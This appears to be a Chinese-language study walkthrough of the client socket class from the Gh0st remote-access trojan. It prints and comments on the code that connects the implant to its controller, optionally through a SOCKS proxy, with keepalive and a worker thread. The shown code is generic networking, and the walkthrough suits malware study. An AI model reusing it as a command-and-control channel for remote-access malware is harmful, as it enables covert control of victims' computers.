

# 成员变量



```c++
class CClientSocket  
{
	friend class CManager;
public:
	CBuffer m_CompressionBuffer;
	CBuffer m_DeCompressionBuffer;
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;
	void Disconnect();
	bool Connect(LPCTSTR lpszHost, UINT nPort);
	int Send(LPBYTE lpData, UINT nSize);
	void OnRead(LPBYTE lpBuffer, DWORD dwIoSize);
	void setManagerCallBack(CManager *pManager);
	void setGlobalProxyOption(int nProxyType = PROXY_NONE, LPCTSTR	lpszProxyHost = NULL, UINT nProxyPort = 1080, LPCTSTR lpszUserName = NULL, LPCSTR lpszPassWord = NULL);
	void run_event_loop();
	bool IsRunning();

	HANDLE m_hWorkerThread;
	SOCKET m_Socket;
	HANDLE m_hEvent;

	CClientSocket();
	virtual ~CClientSocket();
private:
	static	int		m_nProxyType;
	static	char	m_strProxyHost[256];
	static	UINT	m_nProxyPort;
	static	char	m_strUserName[256];
	static	char	m_strPassWord[256];

	BYTE	m_bPacketFlag[FLAG_SIZE];
	bool ConnectProxyServer(LPCTSTR lpszHost, UINT nPort);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	int SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	bool m_bIsRunning;
	CManager	*m_pManager;  //---查看CManager 类的OnReceive函数

};
```





# 成员函数



## CClientSocket ()

对于构造函数

```cpp
CClientSocket::CClientSocket()
{
   //---初始化套接字
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// 数据包前缀复制
	BYTE bPacketFlag[] = {'G', 'h', '0', 's', 't'};    //注意这个数据头 ，在讲解gh0st主控端的时候我就说过，要一致
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}
```



## Disconnect()

关闭连接

```c++
void CClientSocket::Disconnect()
{
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    
    //立即关闭连接，不等待未发送的数据。
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) )；

	CancelIo((HANDLE) m_Socket);//取消与套接字关联的异步 I/O 操作
	InterlockedExchange((LPLONG)&m_bIsRunning, false);//将 m_bIsRunning 成员变量的值设置为 false
	closesocket(m_Socket);//关闭套接字，释放关联的资源
	
	SetEvent(m_hEvent);	//设置一个信号量

	m_Socket = INVALID_SOCKET;//无效socket状态
}
```



## Connect()



```c++
//---向主控端发起连接
bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
```

参数1是ip,参数2是端口

主要对服务端发起一个连接





```c++
//---向主控端发起连接
bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();//关闭之前的连接

	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;

    //m_nProxyType是静态变量,在很早之前就已经初始化
	if (m_nProxyType != PROXY_NONE && m_nProxyType != PROXY_SOCKS_VER4 && m_nProxyType != PROXY_SOCKS_VER5)
    {
        return false;
    }
    //创建一个套接字
	m_Socket = socket(AF_INET, //ipv4
                      SOCK_STREAM, //可靠传输
                      IPPROTO_TCP //使用TCP
                     ); 

	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}

	hostent* pHostent = NULL;
	if (m_nProxyType != PROXY_NONE)
		pHostent = gethostbyname(m_strProxyHost);
	else
		pHostent = gethostbyname(lpszHost);//传递进去的是IP地址

	if (pHostent == NULL)
		return false;
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	if (m_nProxyType != PROXY_NONE)
		ClientAddr.sin_port	= htons(m_nProxyPort);
	else
		ClientAddr.sin_port	= htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return false;
// 禁用Nagle算法后，对程序效率有严重影响
// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
//   const char chOpt = 1;
// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

	// 验证socks5服务器
	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
	{
		return false;
	}
	// 不用保活机制，自己用心跳实瑞
	
	const char chOpt = 1; // True
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}

	m_bIsRunning = true;
	//---连接成功，开启工作线程  转到WorkThread
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}
```

